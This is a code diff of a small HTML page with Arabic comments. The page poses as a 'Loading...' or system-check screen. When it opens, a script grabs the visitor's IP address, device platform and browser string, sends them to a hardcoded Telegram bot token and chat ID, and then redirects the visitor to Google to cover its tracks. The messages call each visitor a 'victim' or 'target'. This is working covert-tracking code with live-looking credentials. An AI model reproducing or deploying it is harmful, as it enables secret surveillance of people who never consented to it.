@@ -1,58 +1,36 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>جاري التحقق من النظام...</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; }
-        .loader { text-align: center; }
-    </style>
-</head>
+<html>
+<head><meta charset="UTF-8"><title>Loading...</title></head>
 <body>
-    <div class="loader">
-        <h2>جاري فحص النظام...</h2>
-        <p>يرجى الانتظار ثانية واحدة</p>
-    </div>
-
     <script>
-        // إعدادات البوت الخاص بك (مستخرجة من صورك السابقة)
         const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8";
         const chatId = "1149386368";
 
-        async function startCapture() {
+        async function send() {
             try {
-                // 1. جلب عنوان IP (عبر خدمة خارجية)
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ip = data.ip;
-
-                // 2. تجميع معلومات الجهاز
-                const platform = navigator.platform;
-                const agent = navigator.userAgent;
-                const time = new Date().toLocaleString('ar-EG');
-
-                // 3. صياغة الرسالة
-                const report = `⚠️ تنبيه: تم دخول ضحية جديد!\n\n🌐 عنوان الـ IP: ${ip}\n📱 الجهاز: ${platform}\n🔍 المتصفح: ${agent}\n⏰ الوقت: ${time}`;
-
-                // 4. إرسال البيانات لتليجرام (طريقة مضمونة لتجنب الحظر)
-                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`;
+                // جلب الـ IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
                 
-                // استخدام Image لضمان إرسال الطلب حتى لو أغلق المتصفح سريعاً
+                // تجهيز الرسالة
+                const text = `🚀 تم اصطياد هدف جديد!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n🔍 المتصفح: ${navigator.userAgent}`;
+
+                // الإرسال عبر رابط مباشر (طريقة لا تُهزم)
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+                
+                // فتح الرابط في الخلفية وإغلاقه فوراً
                 const img = new Image();
-                img.src = telegramUrl;
-
-            } catch (error) {
-                console.error("Error:", error);
-            }
-
-            // 5. التمويه: تحويل المستخدم إلى جوجل بعد ثانية واحدة
-            setTimeout(() => {
+                img.src = url;
+                
+                // الانتظار قليلاً للتأكد من الإرسال ثم التحويل
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            } catch (e) {
                 window.location.href = "https://www.google.com";
-            }, 1500);
+            }
         }
-
-        // تشغيل العملية فور فتح الصفحة
-        startCapture();
+        send();
     </script>
 </body>
 </html>
